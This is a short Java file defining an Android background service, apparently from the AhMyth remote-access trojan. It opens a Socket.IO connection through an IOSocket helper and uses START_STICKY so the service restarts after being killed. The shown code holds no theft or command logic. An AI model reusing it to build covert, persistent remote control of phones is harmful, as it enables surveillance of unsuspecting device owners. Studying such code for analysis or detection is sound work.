package ahmyth.mine.king.ahmyth;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import com.github.nkzawa.socketio.client.Socket;

public class MainService extends Service {
    private static final String TAG = "MainService";
    private static Context contextOfApplication;
    private Socket ioSocket;

    @Override
    public void onCreate() {
        super.onCreate();
        contextOfApplication = getApplicationContext();
        Log.d(TAG, "MainService created");
        
        // Initialize socket connection
        ioSocket = IOSocket.getInstance().getIoSocket();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "MainService started");
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static Context getContextOfApplication() {
        return contextOfApplication;
    }
} 